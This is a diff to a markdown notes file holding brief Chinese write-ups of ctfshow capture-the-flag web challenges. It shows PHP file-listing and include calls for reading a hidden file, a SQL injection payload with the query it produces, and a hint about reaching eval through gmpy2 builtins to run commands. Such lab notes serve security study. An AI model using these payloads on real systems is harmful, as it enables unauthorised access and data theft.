@@ -1,6 +1,29 @@
 # web
 
+## 大赛复现
+
+### web680
+php代码执行,过滤了很多函数,无法使用蚁剑插件绕过
+查看当前目录
+`var_dump(scandir('./'));`
+读取文件
+`include('secret_you_never_know');`
+
+### web681
+#sql
+`select count(*) from ctfshow_users where username = 'admin' or nickname = 'admin'`
+
+输入会同时插入username和nickname,输入一个`or/**/1=1#\`
+`select count(*) from ctfshow_users where username = 'or/**/1=1#\' or nickname = 'or/**/1=1#\'`
+中间一部分被转为分号内一部分
+
+### web682
+前端题,很多反调试
+
+
+
 ## 菜狗杯
+
 ### 算力升级
 只允许`dir(gmyp2)`里的函数
 gmpy2的__builtins__里有eval,拼接执行命令
